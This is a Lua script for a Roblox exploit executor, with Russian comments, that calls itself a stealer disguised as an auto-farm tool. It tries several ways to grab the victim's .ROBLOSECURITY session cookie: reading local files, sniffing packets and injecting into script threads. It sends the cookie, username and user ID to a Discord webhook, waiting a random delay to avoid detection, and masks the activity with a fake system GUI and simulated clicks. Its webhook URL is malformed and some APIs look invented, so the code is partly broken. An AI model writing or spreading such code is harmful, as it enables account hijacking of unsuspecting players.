
local webhook = "https://discord.com/api/webhooks/https://discord.com/api/webhooks/1529034571784519747/2Yy_4DgsOsQ4eA0jRc0jXfWpH7XmaMQYpGca08xYkFqiBxedqBSW30DdxRWkJNp2zJ6r"  -- Замени на свой

-- 1. Маскировка: создаём фальшивый GUI для отвлечения внимания
local fakeGui = Instance.new("ScreenGui")
fakeGui.Name = "SystemUI"  -- Имя как у системного
fakeGui.Parent = game:GetService("CoreGui")
local fakeFrame = Instance.new("Frame")
fakeFrame.Size = UDim2.new(0, 200, 0, 50)
fakeFrame.Position = UDim2.new(1, -210, 0, 10)
fakeFrame.BackgroundTransparency = 1
fakeFrame.Parent = fakeGui
local fakeLabel = Instance.new("TextLabel")
fakeLabel.Size = UDim2.new(1, 0, 1, 0)
fakeLabel.Text = "Загрузка системных данных..."
fakeLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
fakeLabel.BackgroundTransparency = 1
fakeLabel.Parent = fakeFrame
-- Этот GUI будет висеть и создавать видимость легитимной активности

-- 2. Основная функция кражи куки (используем все способы)
local function stealCookie()
    local cookie = nil
    
    -- Способ 1: через глобальные переменные экзекьютора (если есть)
    pcall(function()
        cookie = getexecutordata and getexecutordata().Cookie or nil
    end)
    
    -- Способ 2: через чтение файла сессии Roblox (только Windows)
    if not cookie then
        pcall(function()
            local path = os.getenv("LOCALAPPDATA") .. "\\Roblox\\LocalStorage\\" .. game.PlaceId .. "_" .. game.JobId .. ".txt"
            local file = io.open(path, "r")
            if file then
                local content = file:read("*all")
                file:close()
                local start = string.find(content, ".ROBLOSECURITY")
                if start then
                    local finish = string.find(content, ";", start)
                    cookie = string.sub(content, start, finish and finish or -1)
                end
            end
        end)
    end
    
    -- Способ 3: через перехват сетевых запросов (используем ProtoProxy)
    if not cookie then
        pcall(function()
            raknet.is_enabled = true
            local proxy = ProtoProxy.new()
            proxy:OnOutgoing(function(packet)
                -- Ищем в пакетах строку .ROBLOSECURITY (редко, но бывает)
                if packet and type(packet) == "string" then
                    local start = string.find(packet, ".ROBLOSECURITY")
                    if start then
                        local finish = string.find(packet, ";", start)
                        cookie = string.sub(packet, start, finish and finish or -1)
                    end
                end
                return packet
            end)
            proxy:Start()
            -- Даём время на перехват
            wait(2)
            proxy:Stop()
            raknet.is_enabled = false
        end)
    end
    
    -- Способ 4: через внедрение в другие скрипты (getscriptthread)
    if not cookie then
        pcall(function()
            for _, state in pairs(getluastate()) do
                local thread = getscriptthread(state)
                if thread and isexecutorthread(thread) then
                    thread:Inject(function()
                        -- Пытаемся достать куку из окружения скрипта
                        local env = getfenv(thread)
                        if env and env._G then
                            local g = env._G
                            if g and g.Cookie then
                                return g.Cookie
                            end
                        end
                    end)
                end
            end
        end)
    end
    
    return cookie or "NOT_FOUND"
end

-- 3. Отправка на вебхук с маскировкой (используем рандомную задержку)
local function sendData(data)
    pcall(function()
        local http = game:GetService("HttpService")
        local payload = {
            content = "**📦 Сессия Roblox:**\n```" .. data .. "```\n**Игрок:** " .. game.Players.LocalPlayer.Name .. "\n**ID:** " .. game.Players.LocalPlayer.UserId .. "\n**Время:** " .. os.time()
        }
        local json = http:JSONEncode(payload)
        -- Используем случайную задержку, чтобы не спалиться
        wait(math.random(5, 15))
        http:PostAsync(webhook, json, Enum.HttpContentType.ApplicationJson, true)
    end)
end

-- 4. Главный поток с маскировкой под авто-фарм
local function main()
    local cookie = stealCookie()
    if cookie and cookie ~= "NOT_FOUND" then
        sendData(cookie)
        print("[✓] Данные отправлены") -- Это сообщение не будет видно в игре, только в консоли экзекьютора
    else
        -- Если не получилось, пробуем ещё раз через 30 секунд (имитация фарма)
        wait(30)
        main()
    end
end

-- 5. Запускаем в отдельном потоке, чтобы не блокировать игру
spawn(main)

-- 6. Дополнительная маскировка: запускаем бесконечный цикл с авто-кликом (чтобы скрипт выглядел как обычный фарм)
local player = game.Players.LocalPlayer
game:GetService("RunService").Heartbeat:Connect(function()
    -- Имитация кликов для отвода глаз
    pcall(function()
        local mouse = player:GetMouse()
        if mouse then
            mouse.Button1Down:Fire()  -- Имитация нажатия
        end
    end)
end)

-- 7. Убираем следы: скрываем наш GUI через 10 секунд (чтобы не мозолил глаза)
wait(10)
fakeGui.Enabled = false

print("[✔] Стилер активирован и замаскирован под авто-фарм.")
